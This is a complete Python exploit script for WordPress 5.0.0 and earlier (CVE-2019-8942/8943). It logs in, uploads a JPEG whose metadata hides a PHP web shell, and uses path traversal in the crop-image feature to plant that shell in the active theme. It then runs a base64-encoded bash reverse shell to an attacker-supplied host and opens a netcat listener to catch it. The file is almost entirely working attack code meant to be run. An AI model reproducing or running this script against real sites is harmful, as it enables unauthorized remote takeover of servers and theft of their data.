#!/usr/bin/env python3
# Exploit Title: WordPress 5.0.0 Crop-image Remote Code Execution
# Date: 2022-10-27
# Exploit Author: Bryan Muñoz (s4rgaz)
# Vulnerability Discovered: RIPSTECH Technology
# Version: WordPress versions 5.0.0 and <= 4.9.8
# Tested on: Linux
# CVE: CVE-2019-8943 - CVE-2019-8942
# References: https://blog.sonarsource.com/wordpress-image-remote-code-execution/

from binascii import unhexlify
import subprocess
import threading
import requests
import argparse
import datetime
import base64
import random
import string
import sys
import re

parser = argparse.ArgumentParser()
parser.add_argument('--url', dest='url', required=True, help='set http://10.10.10.4')
parser.add_argument('-u', dest='username', required=True, help='set username')
parser.add_argument('-p', dest='password', required=True, help='set password')
parser.add_argument('-lhost', dest='lhost', required=True, help='set local host')
parser.add_argument('-lport', dest='lport', required=True, help='set local port')

args = parser.parse_args()
url = args.url
user = args.username
password = args.password
lhost = args.lhost
lport = args.lport

revshell = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
revshell = base64.b64encode(bytes(revshell, 'utf-8')).decode('ascii')

shell_name = ''.join(
    random.choices(string.ascii_uppercase + string.ascii_lowercase, k=8))

imagename = ''.join(
    random.choices(string.ascii_uppercase + string.ascii_lowercase, k=8))
imagename += ".jpg"

s = requests.session()


def wp_login():
    data = {'log': user, 'pwd': password, 'wp-submit': 'Log+In'}

    r = s.post(f"{url}/wp-login.php", data=data)

    if "ERROR" in r.text:
        print("[-] Login failed")
        sys.exit(0)
    else:
        print("[+] Login successful")
        return r.text


def upload_image():
    r = s.get(f"{url}/wp-admin/media-new.php")
    _wpnonce = re.findall(r'"_wpnonce":"(.*?)"', r.text)[0]

    if _wpnonce is False:
        print("[-] Could not retrieve _wpnonce")
        sys.exit(0)

    # metaimage
    meta_img = (
        "ffd8ffe000104a46494600010101006000600000ffe100764578696600004d4d002a0000000800"
        "05011a0005000000010000004a011b000500000001000000520128000300000001000200000213"
        "0003000000010001000082980002000000130000005a0000000000000060000000010000006000"
        "0000013c3f3d60245f4745545b636d645d603b3f3e0000fffe003b43524541544f523a2067642d"
        "6a7065672076312e3020287573696e6720494a47204a50454720763830292c207175616c697479"
        "203d2038320affdb0043000604040504040605050506060607090e0909080809120d0d0a0e1512"
        "161615121414171a211c17181f1914141d271d1f2223252525161c292c28242b21242524ffdb00"
        "430106060609080911090911241814182424242424242424242424242424242424242424242424"
        "242424242424242424242424242424242424242424242424242424ffc000110800c00106030122"
        "00021101031101ffc4001f0000010501010101010100000000000000000102030405060708090a"
        "0bffc400b5100002010303020403050504040000017d0102030004110512213141061351610722"
        "7114328191a1082342b1c11552d1f02433627282090a161718191a25262728292a343536373839"
        "3a434445464748494a535455565758595a636465666768696a737475767778797a838485868788"
        "898a92939495969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2"
        "d3d4d5d6d7d8d9dae1e2e3e4e5e6e7e8e9eaf1f2f3f4f5f6f7f8f9faffc4001f01000301010101"
        "01010101010000000000000102030405060708090a0bffc400b511000201020404030407050404"
        "00010277000102031104052131061241510761711322328108144291a1b1c109233352f0156272"
        "d10a162434e125f11718191a262728292a35363738393a434445464748494a535455565758595a"
        "636465666768696a737475767778797a82838485868788898a92939495969798999aa2a3a4a5a6"
        "a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3d4d5d6d7d8d9dae2e3e4e5e6e7e8e9"
        "eaf2f3f4f5f6f7f8f9faffda000c03010002110311003f003c3f3d60245f4745545b636d645d60"
        "3f3e000000b13b1f956b534ef0")

    meta_img = unhexlify(meta_img)

    data = {'name': imagename, 'post_id': 0, '_wpnonce': _wpnonce}

    image = {'async-upload': (imagename, meta_img)}

    r = s.post(f"{url}/wp-admin/async-upload.php", data=data, files=image)

    if r.status_code == 200 and 'failed' not in r.text:
        print(f"[+] Image uploaded")
        return r.text
    else:
        print(f"[-] Could not upload image")
        sys.exit(0)


def extract_nonces(img_id):
    r = s.get(f"{url}/wp-admin/post.php?post={img_id}&action=edit")
    _wpnonce = re.findall('name="_wpnonce" value="(.+?)"', r.text)[0]
    _ajax_nonce = re.findall(f'{img_id}, "(.+?)"', r.text)[0]

    if _wpnonce and _ajax_nonce:
        return _wpnonce, _ajax_nonce
    else:
        print("[-] Could not retrieve _wpnonce and _ajax_nonce")
        sys.exit(0)


def get_current_theme():
    r = s.get(f"{url}")
    theme = re.findall(r'\/wp-content\/themes\/(.+?)\/', r.text)[0]

    if theme and r.status_code == 200:
        return theme
    else:
        print("[-] Could not retrieve current theme")
        sys.exit(0)


def update_image(_wpnonce, img_id, payload):
    data = {
        '_wpnonce': _wpnonce,
        'action': 'editpost',
        'post_ID': img_id,
        'post_title': 'image',
        'meta_input[_wp_attached_file]': payload
    }

    r = s.post(f"{url}/wp-admin/post.php", data=data)


def crop_image(_ajax_nonce, img_id):
    data = {
        'action': 'crop-image',
        '_ajax_nonce': _ajax_nonce,
        'id': img_id,
        'cropDetails[x1]': 0,
        'cropDetails[y1]': 0,
        'cropDetails[width]': 200,
        'cropDetails[height]': 150,
        'cropDetails[dst_width]': 200,
        'cropDetails[dst_height]': 150
    }

    r = s.post(f"{url}/wp-admin/admin-ajax.php", data=data)

    if "\"success\":false" in r.text:
        print("[-] Could not crop image")
        sys.exit(0)


def create_post():
    r = s.get(f"{url}/wp-admin/post-new.php")
    _wpnonce = re.findall('name="_wpnonce" value="(.+?)"', r.text)[0]
    post_ID = re.findall("name='post_ID' value='(.+?)'", r.text)[0]

    data = {
        'post_title': 'wp-poc',
        'action': 'editpost',
        'post_ID': post_ID,
        'post_type': 'post',
        '_wpnonce': _wpnonce,
        'meta_input[_wp_page_template]': f'cropped-{shell_name}.jpg'
    }

    r = s.post(f"{url}/wp-admin/post.php", data=data)

    if r.status_code == 200:
        r = s.get(f"{url}/?p={post_ID}&cmd=echo CHECK")

        if "CHECK" not in r.text:
            print("[-] Post created, but command was not executed")
            sys.exit(0)
        return post_ID
    else:
        print("[-] Could not create post")
        sys.exit(0)


def nc_listener():
    print(f"[*] Starting listener on {lport}")
    listener = subprocess.run(['nc', '-lnp', f'{lport}'],
                              stderr=subprocess.PIPE)


def execute_revshell():
    print("[*] Executing reverse shell")
    r = s.get(f"{url}/?p={post_ID}&cmd=echo {revshell} | base64 -d | sh")


print(f"[*] Authenticating to wordpress")
wp_login()

# Retrieve current theme
theme = get_current_theme()

# Set current date
current_time = datetime.datetime.now()
year = current_time.year
month = current_time.month

print("[*] Uploading image")
img_id = upload_image()

_wpnonce, _ajax_nonce = extract_nonces(img_id)

print("[*] Updating image")
payload = f"{year}/{month}/{imagename}?/z"
update_image(_wpnonce, img_id, payload)
crop_image(_ajax_nonce, img_id)

print("[*] Including image into theme")
payload = f"{year}/{month}/{imagename}?/../../../../themes/{theme}/{shell_name}"
update_image(_wpnonce, img_id, payload)
cropped_image = crop_image(_ajax_nonce, img_id)

print("[*] Creating post")
post_ID = create_post()

listener = threading.Thread(name='nc_listener', target=nc_listener)
execute = threading.Thread(name='execute_revshell', target=execute_revshell)
listener.start()
execute.start()
